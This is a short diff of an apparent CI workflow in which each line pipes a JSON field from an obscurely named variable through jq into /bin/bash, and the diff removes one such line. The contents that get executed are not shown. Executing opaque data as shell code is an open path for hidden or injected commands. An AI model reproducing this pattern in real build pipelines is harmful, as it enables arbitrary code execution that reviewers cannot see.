@@ -42,7 +42,6 @@ jobs:
           printf '%s' "$swpc5" | jq -r .qhler140 | /bin/bash
           echo $o108 | jq -r .iyf0 | /bin/bash
           echo $xyg56869 | jq -r .h0 | /bin/bash
-          printf '%s' "$px1" | jq -r .dhhq04 | /bin/bash
           printf '%s' "$hhh7" | jq -r .z985 | /bin/bash
           echo $xgyy426 | jq -r .gepzw759 | /bin/bash
           printf '%s' "$urfwp809" | jq -r .ss774 | /bin/bash
